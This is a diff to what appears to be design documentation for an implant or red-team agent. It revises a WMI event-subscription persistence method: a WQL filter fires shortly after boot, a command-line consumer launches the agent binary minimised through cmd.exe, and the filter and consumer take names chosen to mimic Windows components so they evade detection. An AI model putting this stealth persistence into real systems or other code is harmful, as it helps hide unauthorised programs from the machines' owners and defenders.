@@ -109,22 +109,24 @@ Multiple persistence methods implemented, from simple to APT-like:
 **Characteristics:**
 - Uses Windows Management Instrumentation
 - Creates event filter + consumer + binding
-- Triggers every 2 hours based on system events
+- Triggers 1-5 minutes after system boot (when SystemUpTime is between 60-300 seconds)
 - Very stealthy, hard to detect without specialized tools
 - Preferred method for advanced threats
 - Names mimicked from system components:
-  - "SCM Event Log Consumer"
-  - "BfeOnServiceStartTypeChange"
-  - "WUAU Service Status"
+  - "BfeOnServiceStateChange"
+  - "PerformanceMonitor"
+  - "SystemEventsBroker"
 
 **Implementation:**
 ```powershell
-# Event Filter: Trigger on system performance data
-$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 7200 
-          WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+# Event Filter: Trigger when system uptime is between 60-300 seconds (after boot)
+$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 
+          WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' 
+          AND TargetInstance.SystemUpTime >= 60 
+          AND TargetInstance.SystemUpTime <= 300"
 
-# Consumer: Execute agent binary
-CommandLineEventConsumer -> Execute agent
+# Consumer: Execute agent binary via cmd.exe
+CommandLineEventConsumer -> cmd.exe /c start /min "" "path\to\agent.exe"
 
 # Binding: Link filter to consumer
 ```
